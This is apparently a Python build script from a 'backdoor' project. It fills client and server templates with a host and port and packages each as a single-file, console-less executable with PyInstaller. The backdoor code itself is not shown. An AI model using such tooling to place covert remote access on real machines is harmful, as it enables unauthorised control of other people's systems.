from argparse import ArgumentParser, Namespace
from pathlib import Path
from string import Template

import PyInstaller.__main__


HERE = Path(__file__).parent.absolute()
path_to_server_template = (
    HERE / "src" / "backdoor" / "templates" / "server_entrypoint.txt"
)
path_to_client_template = (
    HERE / "src" / "backdoor" / "templates" / "client_entrypoint.txt"
)
path_to_entrypoint = HERE / "entrypoint.py"


def parse_args() -> Namespace:
    parser = ArgumentParser()

    parser.add_argument(
        "-s",
        "--server",
        required=False,
        action="store_true",
        help="Build the server. If both -s and -c are omitted, both defaults to true.",
    )
    parser.add_argument(
        "-c",
        "--client",
        required=False,
        action="store_true",
        help="Build the client. If both -s and -c are omitted, both defaults to true.",
    )
    parser.add_argument(
        "-a",
        "--host",
        required=True,
        help="Host address the client is going to connect to.",
    )
    parser.add_argument(
        "-p",
        "--port",
        required=True,
        help="The port on host the server is running on.",
        type=int,
    )
    args = parser.parse_args()
    if not (args.server or args.client):
        args.server = args.client = True
    return args


def create_entrypoint(
    template_path: Path, entrypoint_path: Path, **kwargs: dict[str, object]
) -> None:
    with template_path.open() as template_file:
        template = Template(template_file.read())
    entrypoint_str = template.safe_substitute(kwargs)
    with entrypoint_path.open(mode="w") as entrypoint:
        entrypoint.write(entrypoint_str)


def build() -> None:
    args = parse_args()

    if args.server:
        create_entrypoint(path_to_server_template, path_to_entrypoint, PORT=args.port)
        PyInstaller.__main__.run(
            [str(path_to_entrypoint), "--onefile", "--windowed", "--name", "server"]
        )

    if args.client:
        create_entrypoint(path_to_client_template, path_to_entrypoint, HOST=f'"{args.host}"', PORT=args.port)  # type: ignore
        PyInstaller.__main__.run(
            [str(path_to_entrypoint), "--onefile", "--windowed", "--name", "client"]
        )

    from cleanup import recursive_delete

    recursive_delete(path_to_entrypoint)


if __name__ == "__main__":
    build()
